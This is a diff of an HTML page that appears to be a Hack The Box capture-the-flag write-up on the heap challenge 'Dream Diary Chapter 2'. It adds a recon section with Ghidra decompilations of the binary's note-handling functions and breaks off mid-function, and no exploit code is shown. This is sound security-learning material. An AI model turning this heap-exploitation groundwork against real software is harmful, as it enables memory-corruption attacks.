@@ -24,13 +24,13 @@ Dream Diary Chapter 2 - HTB - Th3R4nd0m&#39;s blog
   </title>
 
   <link rel="stylesheet" href="/assets/css/style.css">
-  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://blog.edmund.digital/feed.xml" title="Th3R4nd0m's blog" /><script async src="https://www.googletagmanager.com/gtag/js?id=G-F8HMZYQ0PM"></script>
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://blog.edmund.digital/feed.xml" title="Th3R4nd0m's blog" /><script async src="https://www.googletagmanager.com/gtag/js?id=UA-191452419-1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-F8HMZYQ0PM');
+  gtag('config', 'UA-191452419-1');
 </script></head><body></script>
 <div class="site-header">
   <div class="wrapper">
@@ -69,6 +69,333 @@ Hi. My second name is edmund. I like pentest, pwn and reverse engineering. Here 
   
   <p>#Recon</p>
 
+<p>We load the binary in Ghidra and we decompile it. We take a look…and looks like it’s a heap challenge. We rename the obvious functions(main, edit, delete, alloc). We take a look at alloc:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">alloc</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+  <span class="kt">ssize_t</span> <span class="n">sVar2</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">__size</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar3</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">number_of_notes</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">size_buf</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+  
+  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">size_buf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">number_of_notes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">number_of_notes</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Too many notes!"</span><span class="p">);</span>
+<span class="nl">LAB_00400af7:</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">__stack_chk_fail</span><span class="p">();</span>
+      <span class="p">}</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Size: "</span><span class="p">);</span>
+      <span class="n">sVar2</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">size_buf</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar2</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Read error!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size_buf</span><span class="p">);</span>
+      <span class="n">__size</span> <span class="o">=</span> <span class="n">SEXT48</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+      <span class="n">pvVar3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+      <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar3</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Malloc error!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+      <span class="n">pvVar3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">__size</span><span class="p">);</span>
+      <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar3</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Malloc error!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="o">**</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">__size</span><span class="p">;</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
+      <span class="n">read_wrapper</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span><span class="n">__size</span><span class="p">,</span>
+                   <span class="n">__size</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
+      <span class="k">goto</span> <span class="n">LAB_00400af7</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">number_of_notes</span> <span class="o">=</span> <span class="n">number_of_notes</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It looks like we can allocate only 0xf notes. When we allocate a note, the program allocates a 0x10 sized chunk: <code class="language-plaintext highlighter-rouge">pvVar3 = malloc(0x10);</code>, it puts the pointer on bss <code class="language-plaintext highlighter-rouge">*(void **)(&amp;DAT_006020c0 + (long)number_of_notes * 8) = pvVar3;</code>, it allocates the desired chunk, and the pointer goes into the 0x10 sized chunk + 8 , and the size of our desired chunk into the 0x10 sized chunk:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+<span class="n">pvVar3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">__size</span><span class="p">);</span>
+<span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar3</span><span class="p">;</span>
+<span class="o">**</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">__size</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>So, we can define a struct for our note, and we set the bss “variable” to <code class="language-plaintext highlighter-rouge">note*[0xf]</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">void</span> <span class="nf">alloc</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+  <span class="kt">ssize_t</span> <span class="n">sVar1</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">__size</span><span class="p">;</span>
+  <span class="n">note</span> <span class="o">*</span><span class="n">current_note</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">number_of_notes</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">size_buf</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+  
+  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">size_buf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">number_of_notes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">number_of_notes</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Too many notes!"</span><span class="p">);</span>
+<span class="nl">LAB_00400af7:</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">__stack_chk_fail</span><span class="p">();</span>
+      <span class="p">}</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Size: "</span><span class="p">);</span>
+      <span class="n">sVar1</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">size_buf</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar1</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Read error!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size_buf</span><span class="p">);</span>
+      <span class="n">__size</span> <span class="o">=</span> <span class="n">SEXT48</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+      <span class="n">current_note</span> <span class="o">=</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+      <span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span> <span class="o">=</span> <span class="n">current_note</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Malloc error!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">current_note</span> <span class="o">=</span> <span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">];</span>
+      <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">__size</span><span class="p">);</span>
+      <span class="n">current_note</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Malloc error!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">__size</span><span class="p">;</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
+      <span class="n">read_wrapper</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="n">__size</span><span class="p">,</span><span class="n">__size</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
+      <span class="k">goto</span> <span class="n">LAB_00400af7</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">number_of_notes</span> <span class="o">=</span> <span class="n">number_of_notes</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Much better. Now the delete function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">delete</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">index_</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">index</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+  <span class="n">index_</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">index_</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">index_</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bounds!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">index_</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Nope!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">index_</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">index_</span><span class="p">]);</span>
+      <span class="n">notes</span><span class="p">[</span><span class="n">index_</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Nothing suspicious here. The <code class="language-plaintext highlighter-rouge">dump</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">dump</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">ssize_t</span> <span class="n">sVar2</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_18</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="n">sVar2</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar2</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Read error!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bounds!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Nope!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Size: %ld | Data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Same thing. The <code class="language-plaintext highlighter-rouge">edit</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_18</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bounds!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Nope!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
+      <span class="n">read_wrapper</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
+      <span class="n">string_terminator</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">string_terminator</span><span class="p">(</span><span class="kt">long</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">long</span> <span class="n">param_2</span><span class="p">)</span>
+
+<span class="p">{</span>
